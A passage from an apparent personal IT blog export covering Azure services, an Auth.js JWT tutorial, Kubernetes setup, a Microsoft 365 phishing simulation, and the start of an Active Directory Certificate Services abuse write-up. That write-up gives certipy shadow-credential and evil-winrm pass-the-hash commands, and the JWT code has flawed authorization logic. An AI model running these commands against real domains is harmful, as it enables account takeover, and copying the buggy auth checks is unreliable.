options.\n\nAzCopy: A CLI Tool which allows us to download, upload and manage Azure Storages\nAzure Storage Explorer: A GUI Tool which can be used for uploading, downloading, and managing Azure Storage options\nAzure File Sync: Synchronizes our on-premises environment with Azure Files\n\nIt’s good to have a fundamental understanding about Azure Storage as it can help with implementing the correct solution and reduce costs.\nAzure Blobs\nAzure Blobs is recommended for storing texts, images, videos, and audio files. With Azure Blobs it’s also possible to create snapshots for each object and quickly obtain the old version of the object. It also comes with the capabilities to store objects in the following tiers:\n\nHot: Recommended to use if the data is frequently accessed\nCool: Recommended to use if the data is going to be stored for 30 days\nArchive: Recommended to use if the data is going to be stored for longer than 180 days\n\nAzure Blobs also allows us to store confidential files and legal files which are not supposed to be modified or deleted using the following features:\n\nTime-Based Retention Policies: Objects can be created and read but not modified or deleted to the retention period has expired on the object.\nLegal Hold Policies: Objects can be created and read but not modified or deleted to legal hold is cleared\n\nUnderstanding the different capabilities of Azure Blobs is extremely useful while integrating to cloud as it can help with reducing costs, confidentiality, and authenticity.\nAzure Functions\nAzure Functions is a serverless feature that allows us to execute code without worrying about the virtual machine. It’s recommended to use Azure Functions to run code which handles REST Requests, Timer, and Messages.\n\n\n                  \n                  Note\n                  \n                \n\n\nWith Azure Functions we are only charged for per-second resource consumptions and execution.\n\n\n\nAzure Logic Apps\nAzure Logic Apps is a serverless compute solution that enables us to create automated workflow without having understanding about programming or scripting. We can create a automated workflow which sends a email to specific users or groups when a event is triggered.\nAzure App Service\nAzure App Service is a Platform as a Service (PaaS) solution that provides us with the capability to run our application code or docker container without needing to maintain the operating system. You can choose three different ways to deploy the application code and container:\n\nShared: Runs application on the same virtual machine including other customers apps\nDedicated: Runs application on dedicated virtual machine and apps on the same App Service Plan share the same compute resources\nIsolated: Runs the application on a dedicated virtual machine on a dedicated virtual network\n\nAzure App Service is a Platform as a Service (PaaS) solution that provides us with the ability to run application code.\nAzure SQL\nAzure SQL is a PaaS solution that is fully managed service where you don’t have to deal with configuring, managing, tuning, and backups. You can also choose between the following two pricing models:\n\nDTU: Fixed price for covering compute, data storage, and backup retention\nvCore: Seperate charges for compute, data storage, and backup retention\n\nIt’s also possible to scale Azure SQL depending on the demand to reduce the costs. Azure SQL also comes with the following data security features:\n\nData At Rest: Transparent Data Encryption\nData In Motion: Secure Socket Layers &amp; Transport Layer Security\nData In Process: Dynamic Data Masking\n\nThese features helps with securing our data at different situations to ensure it stays confidential and secure at all times.\n\n\n                  \n                  Important\n                  \n                \n\n\nIf you’re migrating SQL database from on-premises it’s recommended to use Azure SQL Managed Instance as it’s better for lift-and-shift scenarios and it comes than Azure SQL.\n\n\n\nAzure Data Warehouse\nflowchart BT;\n\t1(Data Warehouse)\n\t2[(Database)]\n\t3[(Database)]\n\t4[(Database)]\n\t8(Power BI)\n\t\n\tsubgraph mySubGraph1[&quot;Databases&quot;]\n\t\t2 \n\t\t3 \n\t\t4\n\tend\n\t\n\t2 --&gt; 1\n\t3 --&gt; 1\n\t4 --&gt; 1\n\t1 --&gt; 8\n\nAzure Data Warehouse is used for storing large amount of structured data which will be used for creating Data Visualization, Power BI, and Data Analytics. Azure Data Warehouse is more expensive to operate and maintain therefore it’s recommended to use Azure Data Lake.\nAzure Data Lake\nflowchart TB;\n\t1(Azure Data Lake)\n\t2(Container)\n\t3(Container)\n\t4(Folder)\n\t5(Folder)\n\t6(Folder)\n\t7(File)\n\t8(FIle)\n\t\n\t1 --&gt; 2\n\t1 --&gt; 3\n\t2 --&gt; 4\n\t2 --&gt; 8\n\t3 --&gt; 5\n\t3 --&gt; 6\n\t6 --&gt; 7\n\nAzure Data Lake is used for storing large amount of structured, semi-structured, and unstructured data. With all the data inside the Azure Data Lake we can use tools such as Azure Databricks and Power BI to create analytical prediction and graphs for management and board members.\nMicrosoft Entra Application Proxy\nflowchart TB\n\tsubgraph subgraph2[&quot;On-Premises&quot;]\n\t\t1(Application Proxy Connector)\n\t\t2(Application)\n\t\t1 --&gt; 2\n\tend\n\t\n\t3(Application Proxy Service)\n\t4(User)\n\t5(www.consto.com)\n\t\n\t3 --&gt; 1\n\t4 --&gt; 5\n\t5 --&gt; 3\n\nMicrosoft Entra Application Proxy is a resource that enables us to access our on-premises applications through an extneral URL. It also allows us to use SSO and MFA on our application to increase security.\nAzure Key Vault\nAzure Key Vault is commonly used for storing certificates and secrets. Azure Key Vault also comes with different SKUs:\n\nDefault: Supports Secrets and Certificates\nPremium: Supports Secrets, Certificates, and HSM Protected Keys\n\nOur applications can access these keys using the following authentication methods:\n\nManaged Identities: You can assign a identity to Azure Resource so it can access the Azure Key Vault\nService Principal and Certificate: You can use service principal and an associated certificate to access the Azure Key Vault\nService Principal and Secrets: You can also use service principal and associated secret to access the Azure Key Vault\n\nIt’s recommended to use Managed Identities if you want a specific resource to access the Azure Key Vault as it’s the most secure option. Note that Azure Key Vault is automatically backed up to a secondary region in-case of a disaster.\nArticles To Read\nMicrosoft highly recommends reading the following articles if the organization is considering moving to Microsoft Azure:\n\nAccelerate migration\nManage cloud costs\nBuild a cloud operations team\nAssessments\n\nIt’s important to read through the articles as it will ensure that the organization’s cloud environment follows the SLA, RPO, RTO set by the management. The articles will also go through the different challenges that will come with moving to the cloud such as training employees and following strict RBAC procedures.\nConclusion\nMicrosoft Azure offers many ways to implement our cloud environment and it comes with many security capabilities to keep our environment secure. It also comes with many capabilities to increase the RTO and RPO to achieve the goals set by the management. Microsoft Azure also supports all sizes of organization’s ranging from small, medium, and large to help them with integrating to the cloud."},"Documents/0007-Understanding-JSON-Web-Token":{"slug":"Documents/0007-Understanding-JSON-Web-Token","filePath":"Documents/0007 Understanding JSON Web Token.md","title":"Understanding JSON Web Token (JWT)","links":[],"tags":[],"content":"Introduction\nCurrently, I’m working on improving my programming skills therefore I decided to start programming an web application with authentication, authorization, and session handling. After researching for a while I stumbled upon JWT Token which I found fascinating and I decided to share the knowledge I gained to potentially help out others with their journey to learn JWT Token.\nJSON Web Token (JWT) is commonly used for authentication and authorization as it’s relatively small size and can be sent through a URL, POST Request, and inside a HTTP Header. The JWT Token contains inform-ation about the user in JSON format:\n{\n\t&quot;id&quot; : &quot;1&quot;,\n\t&quot;name&quot; : &quot;Husenjan&quot;,\n\t&quot;email&quot; : &quot;hhesenjan@hotmail.com&quot;,\n\t&quot;role&quot; : &quot;User&quot;\n}\nTo avoid the data from being tampered with the JWT Token is encrypted and digitally signed. When an user tries to access a protected resource, the server extracts information inside JWT Token and determines what the user can access and cannot access.\nJWT Implementation\nI’ll be creating an Next.JS 14 web application and I’ll be using the Auth.JS v5 to implement JWT to our web application since it comes with all the features necessary for authentication and authorization.\nYou will need to install the following modules:\nnpm install next-auth@beta\nnpm install zod\nYou will need to generate a random value which will be used to encrypt the token:\nnpx auth secret\nWith Auth.JS v5 there are many providers which you can choose from such as Google, GitHub, Twitter, and Okta. However, I’ll go with Credentials Provider as I’ll authenticate against my own MySQL Server. We should start off setting up our input handler with the zod module.\n/libs/zod.tsximport { object, string } from &quot;zod&quot;;\n \nexport const signInSchema = object({\n  email : string({ required_error : &quot;Email is required&quot; })\n  .min(1, &quot;Email is too short&quot;),\n  password : string({ required_error : &quot;Password is required&quot;})\n  .min(6, { message : &quot;Password length must be minimum 6 characters&quot;})\n  .max(40, &quot;Password cannot exceed 40 characters&quot;)\n});\nThe signInSchema will be used to validate users input and prevent attacks such as SQL Injections, Server-Side Template Injections and so forth… Now as our users input are being handled, we can start implementing connection to MySQL server.\n/libs/db.tsximport mysql from &quot;mysql2/promise&quot;;\n \nexport const pool = mysql.createPool({\n  host: process.env.DB_HOST,\n  user: process.env.DB_USER,\n  password: process.env.DB_PASSWORD,\n  database: process.env.DB_DATABASE,\n  waitForConnections: true,\n});\nYou can replace the process.env.* with the database credentials and informations. Now we can start imple-menting JWT by creating auth.tsx inside our root directory.\n/auth.tsximport NextAuth from &quot;next-auth&quot;;\nimport Credentials from &quot;next-auth/providers/credentials&quot;\nimport { signInSchema } from &quot;./libs/zod&quot;;\nimport { pool } from &quot;./libs/mysql&quot;;\nconst bcrypt = require(&quot;bcryptjs&quot;);\n \n// Including `role` variable into JWT\ndeclare module &quot;@auth/core/types&quot; {\n  interface User {\n      role?: string | null\n  }\n \n  interface Session {\n      user : {\n          role?: string | null | unknown\n      }\n  }\n \n  interface Profile {\n      role?: string | null\n  }\n}\n \ndeclare module &quot;@auth/core/jwt&quot; {\n  interface JWT {\n      role?: string | null \n  }\n}\n \n// Handles the signIn, signOut, and sessions\nexport const {handlers, signIn, signOut, auth } = NextAuth({\n  providers : [\n    // Credentials allows us to authenticate against our own SQL server\n    Credentials({\n      credentials: {\n        email: {},\n        password: {},\n      },\n      authorize: async (credentials) =&gt; {\n        // Validates the user input to ensure it follows our rules and doesn&#039;t contain malicious payload\n        const vfields = await signInSchema.safeParseAsync(credentials);\n \n        if (!vfields.success) {\n          return { error : &quot;Failed at validation&quot; };\n        }\n        \n        // Getting the user from database\n        const db = await pool.getConnection();\n        const query = &quot;SELECT * FROM users WHERE email = ?&quot;;\n        const [rows] = await db.query(query, [vfields.data.email]);\n        db.release();\n \n        // If user is not found it will fail the authentication\n        if (!rows) {\n          return null;\n        }\n \n        // If user is found then the password hash is compared to the password\n        const comparePassword = await bcrypt.compare(vfields.data.password, rows[0].password);\n \n        // If comparison fails it will fail the authentication\n        if (!comparePassword) {\n          return null;\n        }\n        \n        // If authentication succeed it will return JWT Token with id, email, name, and role\n        return {\n          id : rows[0].id,\n          email : rows[0].email,\n          name : rows[0].name,\n          role : rows[0].role,\n        }\n      }\n    }),\n  ],\n  pages: {\n      signIn: &#039;/login&#039;,\n  },\n  callbacks: {\n    // Implementing roles into our JWT Token\n    async session({ session, token }) {\n        session.user.role =  token.role;\n        return session;\n    },\n    // Implementing roles into our JWT Token\n    async jwt({ token }) {\n        if (user) {\n            token.role = user.role;\n        }\n        return token;\n    },\n  }\n});\nWe can now start implementing our login page with the client mode to validare users input, handle errors, and authentication, and authorization. It’s important to note that Auth.JS v5 supports authenticating thro-ugh client mode and server mode. In our case we will use client mode as we will handle multiple of error messages.\n/components/sign-in.tsx&quot;use client&quot;;\nimport { useRouter } from &quot;next/navigation&quot;;\nimport { useState } from &quot;react&quot;;\nimport { signIn } from &quot;next-auth/react&quot;;\nimport { signInSchema } from &quot;@/libs/zod&quot;;\nimport Link from &quot;next/link&quot;;\n \n// FormErrorHandler will be used to handle our validation errors\ntype FormErrorHandler = {\n    email?: string[] | undefined, \n    password?: string[] | undefined,\n}\n \nexport default function SignIn() {\n  // Router will push the user to a specific page\n  const router = useRouter();\n  // useState will be used to handle the different errors\n  const [validationErrors, setValidationErrors] = useState&lt;FormErrorHandler&gt;();\n  const [commonErrors, setCommonErrors] = useState&lt;string&gt;();\n \n  const credentialsAction = async(formData: FormData) =&gt; {\n    // Validates user input\n    const vfields = signInSchema.safeParse({\n        email : formData.get(&quot;email&quot;),\n        password : formData.get(&quot;password&quot;),\n    });\n \n    // Throws an error message if user input fails\n    if (!vfields.success) {\n        setCommonErrors(undefined);\n        setValidationErrors(vfields.error.formErrors.fieldErrors);\n        return;\n    }\n    else {\n      // If validation is successfull it will send a sign-in request\n      const res = await signIn(&quot;credentials&quot;, {\n          email : formData.get(&quot;email&quot;),\n          password : formData.get(&quot;password&quot;),\n          redirect : false,\n      });\n \n      // If the sign-in fails an error message is displayed\n      if (res?.error) {\n          setValidationErrors(undefined);\n          setCommonErrors(&quot;Invalid email or password.&quot;);\n          return;\n      }\n \n      // If the sign-in succeed the user is pushed to /\n      router.push(&quot;/&quot;);\n    }\n  }\n \n  return (\n      &lt;div className=&quot;w-screen h-screen flex items-center justify-center&quot;&gt;\n          &lt;div className=&quot;block w-[270px]&quot;&gt;\n              &lt;div&gt;\n                  &lt;p&gt;Login&lt;/p&gt;\n              &lt;/div&gt;\n              &lt;form action={credentialsAction}&gt;\n                  &lt;div className=&quot;mt-2 grid grid-cols-1&quot;&gt;\n                      &lt;label htmlFor=&quot;credentials-email&quot; className=&quot;text-sm text-zinc-300&quot;&gt;Email&lt;/label&gt;\n                      &lt;input className=&quot;mt-1 p-1 pl-2 text-xs rounded-lg bg-zinc-900 outline outline-1 outline-zinc-700 text-zinc-300&quot; type=&quot;email&quot; name=&quot;email&quot; /&gt;\n                      \n                      {  validationErrors?.email?.length !== undefined ? (\n                          &lt;p className=&quot;text-xs text-red-500 mt-2&quot;&gt;{ validationErrors?.email }&lt;/p&gt;\n                      ) : null}\n \n                  &lt;/div&gt;\n                  &lt;div className=&quot;mt-2 grid grid-cols-1&quot;&gt;\n                      &lt;label htmlFor=&quot;credentials-password&quot; className=&quot;text-sm text-zinc-300&quot;&gt;Password&lt;/label&gt;\n                      &lt;input className=&quot;mt-1 p-1 pl-2 text-xs rounded-lg bg-zinc-900 outline outline-1 outline-zinc-700 text-zinc-300&quot; type=&quot;password&quot; name=&quot;password&quot; /&gt;\n                      \n                      { validationErrors?.password?.length !== undefined  ? (\n                          &lt;p className=&quot;text-xs text-red-500 mt-2&quot;&gt;{ validationErrors?.password }&lt;/p&gt;\n                      ) : null }\n                      \n                      { commonErrors?.length !== undefined ? (\n                          &lt;p className=&quot;text-xs text-red-500 mt-2&quot;&gt;{ commonErrors }&lt;/p&gt;\n                      ) : null}\n                  &lt;/div&gt;\n                  &lt;div className=&quot;mt-2 grid grid-cols-1&quot;&gt;\n                      &lt;button className=&quot;mt-1 text-sm p-1 bg-zinc-950 rounded-lg outline outline-1 outline-zinc-800 text-zinc-300&quot;&gt;Sign In&lt;/button&gt;\n                  &lt;/div&gt;\n              &lt;/form&gt;\n              &lt;div className=&quot;mt-1&quot;&gt;\n                  &lt;Link className=&quot;text-xs text-sky-400&quot; href=&quot;/register&quot;&gt;Interested in signing up?&lt;/Link&gt;\n              &lt;/div&gt;\n          &lt;/div&gt;\n      &lt;/div&gt;\n  );\n}\nThe validationErrors is used for displaying the error messages that comes from the signInSchema  and the commonErrors is used to displaying sign-in failed messages when users enters wrong credentials. If the login is successful then the user is pushed to the /dashboard.\nWe can now start implementing our middleware to restrict access to specific protected resources such as /dashboard and /admin panels to logged in users.\n./middleware.tsximport { auth } from &quot;@/auth&quot;;\n \nexport default auth( async(req) =&gt; {\n  // Only allow administrators to access `/admin` panel\n  if (req.auth &amp;&amp; req.auth === &quot;Administrator&quot; &amp;&amp; req.nextUrl.pathname === &quot;/admin&quot;) {\n    return;\n  }\n \n  // If user is unauthenticated and tries to access any resources forward them to `/login`\n  if (!req.auth &amp;&amp; req.nextUrl.pathname === &quot;/&quot;){\n    const newUrl = new URL (&quot;/login&quot;, req.nextUrl.origin);\n    return Response.redirect(newUrl)\n  }\n  \n  // If user is authenitcated and tries to login forward then to `/dashboard`\n  if (req.auth &amp;&amp; req.nextUrl.pathname === &quot;/login&quot;){\n    const newUrl = new URL (&quot;/dashboard&quot;, req.nextUrl.origin);\n    return Response.redirect(newUrl)\n  }\n})\n \n// Avoids including middleware on the pages defined\nexport const config = {\n  matcher: [\n  &#039;/((?!api|_next/static|_next/image|favicon.ico).*)&#039;,\n  ],\n}\nBasically, all the middleware does is it ensures that only logged in users can access /dashboard and only administrators can access /admin panel. If you have specific resources that you only want specific roles to be able to access it’s recommended to use middleware.\nConclusion\nImplementing JWT is fairly simple because of the Auth.JS v5 library but there are some features missing such as a way to refresh tokens and delete token if it does get compromised by a malicious actor. However, these are security features which I’ll go through implementing in the future once I’m more familiar with the Auth.JS v5 library.\nOverall if you’re not familiar with JWT, I highly recommend learning it by using the Auth.JS v5 library as it will help you with getting basic understanding about JWT."},"Documents/0008-Building-A-Kubernetes-Cluster":{"slug":"Documents/0008-Building-A-Kubernetes-Cluster","filePath":"Documents/0008 Building A Kubernetes Cluster.md","title":"Building A Kubernetes Cluster","links":[],"tags":[],"content":"Introduction\nI recently saw that a-lot of job postings are requesting IT-Professionals with Kubernetes skills and I haven’t really worked with Kubernetes at all. Therefore I decided to research Kubernetes to understand the way it works and create my own Kubernetes cluster.\nWhat is Kubernetes?\nKubernetes is used to manage and scale applications running in containers. A container is a small and isolated environment which is commonly used by developers to develop applications because it allows them to share the container with other developers and clients without any issues occurring because of configuration on laptop/server.\nKubernetes extends the functionality of container by allowing us to do the following actions:\n\nStarting new apps when needed\nRestarting apps if they crash\nSpreading out work through different systems\nScaling up and down depending on the demands\n\nThese are some of the benefits of Kubernetes, and we can extend the functionality by using extensions. Here are some terms which are useful to be aware of while working with Kubernetes:\n\nA Kubernetes Environment is considered to be a Cluster.\nA Cluster contains nodes which are our virtual machines/physical machines that will be running our containers.\nA Node Master controls all the Worker Nodes and tells them to run containers.\n\nThese terms will be used throughout the document so it’s important to be familiar with them.\nSetting Up Kubernetes Cluster\nflowchart TB;\n\t1(Master Node)\n\t2(Worker Node 1)\n\t3(Worker Node 2)\n  \n  4(Pod 1)\n  5(Pod 2)\n  6(Pod 3)\n  7(Pod 1)\n  8(Pod 2)\n\n  9(Containers)\n  10(Containers)\n  11(Containers)\n  12(Containers)\n  13(Containers)\n\n\t1 --&gt; 2\n\t1 --&gt; 3\n\n  2 --&gt; 4\n  2 --&gt; 5\n  2 --&gt; 6\n\n  3 --&gt; 7\n  3 --&gt; 8\n\n  4 --&gt; 9\n  5 --&gt; 10\n  6 --&gt; 11\n  7 --&gt; 12\n  8 --&gt; 13\n\n\n\nI’ll be using Ubuntu 24.04.1 LTS Server for setting up the Kubernetes environment. The Kubernetes Cluster will have a single master node and two worker nodes. Now let’s get started with setting up our Kubernetes Cluster!\nFirst we need to create an overview of our Networking environment for Ubuntu Servers since this will help us with understanding our environment.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nServer NameIP AddressHost NameUbuntu Server 1 - Master Node192.168.58.200kmasterUbuntu Server 2 - Kubernetes Worker Node 1192.168.58.201kworker1Ubuntu Server 3 - Kubernetes Worker Node 2192.168.58.202kworker2\nWe need to SSH into all of the servers and create a 01-netcfg.yaml inside /etc/netplan folder with the following content inside them:\nUbuntu Server 1\nnetwork:\n  ethernets:\n    ens33:\n      dhcp4: false\n      addresses: [192.168.58.200/24]\n      routes:\n        - to: default\n          via: 192.168.58.2\n      nameservers:\n        addresses: [8.8.8.8, 8.8.4.4]\nUbuntu Server 2\nnetwork:\n  ethernets:\n    ens33:\n      dhcp4: false\n      addresses: [192.168.58.201/24]\n      routes:\n        - to: default\n          via: 192.168.58.2\n      nameservers:\n        addresses: [8.8.8.8, 8.8.4.4]\nUbuntu Server 3\nnetwork:\n  ethernets:\n    ens33:\n      dhcp4: false\n      addresses: [192.168.58.202/24]\n      routes:\n        - to: default\n          via: 192.168.58.2\n      nameservers:\n        addresses: [8.8.8.8, 8.8.4.4]\nYou will need to change the addresses and routes field to your own networking environment as the IP-address and subnet mask will be different. I also recommend disabling DHCP on 50-cloud-init.yaml file on all the Ubuntu Servers to ensure our servers only has the static IP-address assigned to it.\nnetwork:\n    ethernets:\n        ens33:\n            dhcp4: false\n    version: 2\nOnce that is completed, we will need to use the following commands to apply the networking configuration to Ubuntu Servers:\nchmod -R 600 /etc/netplan/01-netcfg.yaml\nsudo netplan apply --debug\n\nNow if you’re SSH into the server you will be disconnected and you will need to re-connect using the new IP-address. Now inside our /etc/hosts file we can add all our IP-addresses with hostnames:\n192.168.58.200 kmaster\n192.168.58.201 kworker1\n192.168.58.202 kworker2\n\nNow we will need to login as root and install all the necessary resources for our Kubernetes Cluster:\n# Logging in as root\nsudo su root\n \n# Getting Latest Repository\nsudo apt-get update\n \n# Installs CURL\nsudo apt-get install apt-transport-https ca-certificates curl gpg -y\n \n # Downloading Public Signing Key for Kubernetes Packages\ncurl -fsSL pkgs.k8s.io/core:/stable:/v1.31/deb/Release.key | sudo gpg --dearmor -o /etc/apt/keyrings/kubernetes-apt-keyring.gpg\n \n# Setting up Repository\necho &#039;deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.gpg] pkgs.k8s.io/core:/stable:/v1.31/deb/ /&#039; | sudo tee /etc/apt/sources.list.d/kubernetes.list\n \n# Getting Latest Repository for Kubernetes\nsudo apt-get update\n \n# Installs Docker\nsudo apt-get install docker.io -y\n \n# Installs Kubernetes\nsudo apt-get install kubeadm kubelet kubectl kubernetes-cni -y\nOn the Ubuntu Server which will be our kmaster execute the following command:\nsudo kubeadm init\nOnce it’s executed successfully you should receive a command such as this:\nkubeadm join 192.168.58.200:6443 --token selqlq.at3ujabpdpnafhwg --discovery-token-ca-cert-hash sha256:b9e195f167d96f52c8540e3145903b9822ef3acb393263d3a05f8cac7efb74a2\nYou will need to execute that command on the worker nodes such as kworker1 and kworker2 and once that is completed execute the following command on kmaster:\nsudo mkdir -p $HOME/.kube\nsudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config\nsudo chown $(id -u):$(id -g) $HOME/.kube/config\nexport KUBECONFIG=/etc/kubernetes/admin.conf\nNow to see all the nodes on our Kubernetes Cluster use the following command:\nroot@kmaster:/home/gnosis# kubectl get nodes\nNAME       STATUS     ROLES           AGE     VERSION\nkmaster    Ready      control-plane   7m44s   v1.31.1\nkworker1   NotReady   &lt;none&gt;          3m47s   v1.31.1\nkworker2   NotReady   &lt;none&gt;          3m20s   v1.31.1\n\nAll our worker nodes are in NotReady status and to resolve this we need to setup Calico on our Kubernetes Cluster since it provides networking functionality and enforces network policies on our cluster:\nkubectl apply -f raw.githubusercontent.com/projectcalico/calico/refs/heads/master/manifests/calico.yaml\nNow all our nodes should be in the Ready status to see all the nodes use the same command again:\nroot@kmaster:/home/gnosis# kubectl get nodes\nNAME       STATUS   ROLES           AGE   VERSION\nkmaster    Ready    control-plane   24m   v1.31.1\nkworker1   Ready    &lt;none&gt;          20m   v1.31.1\nkworker2   Ready    &lt;none&gt;          19m   v1.31.1\n\nTo ensure our Kubernetes Cluster is working properly, we can deploy container with multiple of pods with a load balancer using the following commands:\nkubectl apply -f k8s.io/examples/service/load-balancer-example.yaml\nkubectl expose deployment hello-world --type=LoadBalancer --name=my-service\nroot@kmaster:/home/gnosis# kubectl get pods\nNAME                           READY   STATUS    RESTARTS   AGE\nhello-world-6ddfc454c8-28x4k   1/1     Running   0          9s\nhello-world-6ddfc454c8-cnks2   1/1     Running   0          9s\nhello-world-6ddfc454c8-dbv7q   1/1     Running   0          9s\nhello-world-6ddfc454c8-fl5sv   1/1     Running   0          9s\nhello-world-6ddfc454c8-qbb8r   1/1     Running   0          9s\n\nTo see which port the load balancer is running at use the following commands:\nkubectl get svc\nYou should now be able to curl the web application and visit it through a web browser:\nroot@kmaster:/home/gnosis# curl http://192.168.58.201:32506\nHello, world!\nVersion: 2.0.0\nHostname: hello-world-6ddfc454c8-dbv7q\nroot@kmaster:/home/gnosis# curl http://192.168.58.202:32506\nHello, world!\nVersion: 2.0.0\nHostname: hello-world-6ddfc454c8-fl5sv\n\nConclusion\nI learnt a lot about Kubernetes while setting up my own cluster. However, there are still a lot of things to learn about Kubernetes such as creating custom networking environment, custom networking policies, and use Terraform to manage our kubernetes environment. Once I’m more familiar with these concepts I’ll try to include them into the document."},"Documents/0009-Create-A-Phishing-Campaign":{"slug":"Documents/0009-Create-A-Phishing-Campaign","filePath":"Documents/0009 Create A Phishing Campaign.md","title":"Creating A Phishing Campaign","links":["posts/OSCP-Review"],"tags":[],"content":"Introduction\nWe were going to hire external consultants to do a phishing campaign for us since the Board Members requested it. However, due to the short time frame the external consultants wouldn’t be able to deliver therefore I decided to take on the responsibility to create a phishing campaign within 48 hours. I decided to apply all the knowledge I gained from the OSCP certification as it taught me a-lot about creating phishing campaign.\nPhishing Email\nThe most important part of creating a phishing campaign is understanding our target and creating a real-istic phishing email as that will help us with finding users who need more cyber security awareness training. In an phishing email we should try to include the following points:\n\nImpersonate Domain: If our domain is contoso.com we should preferrably create a phishing campaign with consto.com or contoso.co as that will create some authencity for the phishing email.\nImpersonate Departement/User: We should try to send email as HR@contoso.co or CEO@contoso.co since that will create some urgency for the user to read the email.\nSpelling Mistakes: We should include spelling mistakes on our email to help users with spotting that the email is a phishing email.\nCreating urgency: It’s important to create urgency on the subject and body of the phishing email as that will increase the likelyhood of the user skim reading through the phishing email.\n\nWe should preferrably try to include all these factors to our phishing email as that will help us with finding users who needs cyber security awareness training. Here’s an example of a phishing email that has all the-se factors:\nFrom: &quot;HR@contso.co&quot;\nSubject: &quot;Salary increase for 2024&quot;\nBody:\n \nHi [Firstname],\n \nWe are happy to inform you that you have recieved a salary incrase for 2024.\n \nPlease urgenlty will out the following form to get your salary increase:\n \n[Malicious Payload]\n \nKind regards,\nHR\nThe email is well crafted and includes spelling mistakes such as rercieved and incrase to help the users spot that it’s a phishing email. It’s important to include urgency and spelling mistakes as it will help us with tea-ching our users what to look after in a phishing email.\nMicrosoft 365 Phishing Campaign\nI’ll be using Microsoft Attack Simulation feature to create our phishing campaign and the method that I’ll be using is credential harvest as that will allow us to see which users clicked on the link and logged in with their credentials. It will also allow us to assign users who failed the phishing campaign training.\nFirst we’ll need to go to the Microsoft 365 Security Portal then we’ll then need to scroll down to Email &amp; Collaboration and select Attack Simulation Training.\n\nWe’ll then need to go to Simulation and select Launch a Simulation to create our phishing campaign.\n\nThe attack simulation allows you to choose many methods for your phishing campaign. However, I recom-mend going with Credential Harvest as that is the most common method malicious actors uses for their phishing attacks.\n\nWe can now choose Tenant Payloads and Create a payload to create our own custom phishing email.\n\nInside Configure Payload we can start creating our own custom phishing email using Code section. The language used for programming the custom email is HTML and I recommend using a IDE such as Visual Studio Code to create your custom phishing email as it comes with autocompletion and code hightlights.\n\nYou can also customize the login page which will be displayed to the users when they click on the link by selecting the payload and going to Login Page section.\n\nOnce we are happy with our phishing email and the login page we can now select the users who will be sent the phishing email from us.\n\nThe attack simulation also allows us to assign training to users who failed the phishing campaign by click-ing on the link or logging with their credentials.\n\nOnce we have choosen the traning method, we can now create our own custom landing page which will show up after the user logins to the phishing website. I highly recommend writing the message in a empat-hic way and explain how they can protect themselves and the organization from the phishing attack and ways to spot it.\n\nWe can now configure our User Notification Settings to send positive reinforcement for reporting the phishing email and training reminders. The positive reinforcement will be sent to the user if they report the phishing email through Outlook report feature.\n\nNow we can choose when the phishing campaign will be sent out to the users. We can choose to send it out right after we submit it or choose a specific time.\n\nNow once we click on submit it will automatically send out the phishing email to the employees that we selected to be a part of the phishing campaign.\n\nCongratulation! You have now successfully launched a phishing campaign using the attack simulation and once the phishing campaign ends you can get analysis about the amount of users who clicked on the phi-shing link and logged in with their credentials and the amount of employees that finished their training after failing the phishing campaign.\nConclusion\nIn a phishing campaign it’s important to include domain impersonation, user/departement impersonation, spelling mistakes, and create urgency as these factors will help us with finding out which users in our organization needs cyber security training. We should never shame our users for clicking on the link and logging in with their credentials instead we should teach and train them up to understand the way malicious actors can attack them and the organization."},"Documents/0010-Abusing-Active-Directory-Certificate-Services":{"slug":"Documents/0010-Abusing-Active-Directory-Certificate-Services","filePath":"Documents/0010 Abusing Active Directory Certificate Services.md","title":"Exploiting Active Directory Certificate Service","links":[],"tags":[],"content":"Information\nActive Directory Certification Services (ADCS) is a service which is widely deployed in all organization’s. It’s a service which is not looked into much by security researchers. I recently read about the vulnerabilities the service has and I decided to dive deeper into the service.\nUnderstanding The Basics\nThe Active Directory has a attribute msDS-KeyCredentialLink that stores raw cryptographic data for password-less authentication for a user or a computer. It also requires the account to have pre-authentication enabled on their account so it can do authentication with certificates. We can use msDS-KeyCredentialLink attribute to obtain shadow credentials and that will allow us to maintain access to the account even when the user changes their credentials.\nPrerequisites\nAn organization with the following requirement’s could be vulnerable for multiple of Active Directory Certi-ficate exploits if the environment isn’t properly managed and misconfigured:\n\nDomain Controller with Windows Server 2016 or later\nDomain Controller with Active Directory Services configured with PKINIT support\n\nObtaining Shadow Credentials\nWhen the environment has all our prerequisities than that enables us to create shadow credentials by writing to the msDS-KeyCredentialLink attribute. This means that we need an account which have GenericAll or GenericWrite over the account which we want to obtain shadow credentials from. When an account has these privileges it can create a certificate and write the public key to the msDS-KeyCredentialLink attribute.\nceritpy-ad shadow add -u &#039;fredrik&#039; -p &#039;password&#039; -t &#039;int.cosmo.com&#039; -account &#039;olivia&#039; \nWhat that command does is creating a certificate and writing the public key to the msDS-KeyCredentialLink attribute and downloading the private key to our Kali Linux system. We can use the private certificate to obtain the ntlm hash of Olivia using the following command:\nceritpy-ad auth -u &#039;olivia&#039; -pfx management_svc.pfx -d &#039;int.cosmo.com&#039;\nThe ntlm hash will enable us to authenticate as Olivia and login to all servers which the user has access to by using the pass-the-hash method. Here’s an example of evil-winrm being used to authenticate to the domain controller.\nevil-winrm -i &#039;int.cosmo.com&#039; -u &#039;olivia&#039; -H &#039;NTLM HASH&#039;\nObtaining shadow credential might seem as a complicated task but misconfiguration happens in an Active Directory environment such as a account accidentally being added into a ACL which has GenericWrite over a service account. The service account might have enough privileges to compromise the whole environment.\nDifferent Vulnerabilities with ADCS\nIt’s important to configure the Active Directory Certificate Service using best practices as misconfiguration can lead to the Active Directory Certificate Service being vulnerable for  ESC1, ESC2, ESC3, ESC4, ESC5, ESC6, ESC7, ESC8 ESC9, ESC10, ESC11, and ESC12. You can read about these vulnerabilities from Certified Pre-Owned - Will Schroeder.\nI’ll go through ESC8 (Vulnerable Certificate Authority Access Control) as an example to showcase the vulnerabilities with ADCS. The ESC8 is an great example as it allows us to laterally move through the Active Directory environment by exploiting misconfigured web enrollment template. Here’s an example of our environment:\nInformation\n\nFredrik has GenericWrite over Olivia\nOlivia can manage the ClientAuthentication template\nClientAuthentication template has domain computer enrollment and client authentication enabled\n\nIn an environment such as these it’s possible to obtain the ntlm hash of any user. We first need to change the userPrincipal of Olivia to administrator, and then request a certificate as olivia, and then change the userPrincipal back to it’s original value. We can then use the private key of administrator to obtain 